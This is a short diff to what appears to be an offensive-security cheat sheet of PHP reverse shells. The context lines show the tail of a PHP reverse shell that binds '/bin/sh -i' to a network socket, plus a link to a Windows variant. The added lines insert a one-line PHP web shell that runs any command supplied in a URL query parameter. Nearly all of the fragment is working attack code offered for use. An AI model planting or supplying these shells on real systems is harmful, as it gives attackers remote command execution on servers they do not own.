@@ -371,6 +371,10 @@ $proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipe
 ?>
 ```
 
+```php
+<?php system($_GET['cmd']); ?>
+```
+
 ## PHP Reverse Shell Windows
 
 `https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php`
